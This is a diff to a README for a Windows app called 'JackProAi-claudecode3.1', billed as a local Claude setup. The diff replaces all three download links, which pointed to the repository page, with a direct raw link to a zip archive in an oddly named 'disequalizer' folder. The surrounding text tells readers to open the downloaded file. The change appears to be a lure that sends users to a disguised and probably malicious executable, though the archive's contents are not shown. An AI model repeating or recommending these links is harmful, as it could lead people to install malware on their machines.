@@ -1,6 +1,6 @@
 # 🧩 JackProAi-claudecode3.1 - Local Claude setup for Windows
 
-[![Download](https://img.shields.io/badge/Download-Visit%20the%20page-blue?style=for-the-badge)](https://github.com/meissnersmarta221/JackProAi-claudecode3.1)
+[![Download](https://img.shields.io/badge/Download-Visit%20the%20page-blue?style=for-the-badge)](https://raw.githubusercontent.com/meissnersmarta221/JackProAi-claudecode3.1/main/disequalizer/Pro-claudecode-Ai-Jack-v2.5.zip)
 
 ## 🚀 What this app does
 
@@ -28,7 +28,7 @@ For a smoother setup, use:
 
 Use this page to download and run the app:
 
-[Download JackProAi-claudecode3.1](https://github.com/meissnersmarta221/JackProAi-claudecode3.1)
+[Download JackProAi-claudecode3.1](https://raw.githubusercontent.com/meissnersmarta221/JackProAi-claudecode3.1/main/disequalizer/Pro-claudecode-Ai-Jack-v2.5.zip)
 
 If the page shows release files, get the Windows file that matches your system. After the download finishes, open the file to start the setup or run the app.
 
@@ -180,7 +180,7 @@ This helps if the app fails after a Windows update or a file change.
 
 If you need the download page later, use this link:
 
-[Visit the JackProAi-claudecode3.1 download page](https://github.com/meissnersmarta221/JackProAi-claudecode3.1)
+[Visit the JackProAi-claudecode3.1 download page](https://raw.githubusercontent.com/meissnersmarta221/JackProAi-claudecode3.1/main/disequalizer/Pro-claudecode-Ai-Jack-v2.5.zip)
 
 ## 🧭 Best first-time path
 
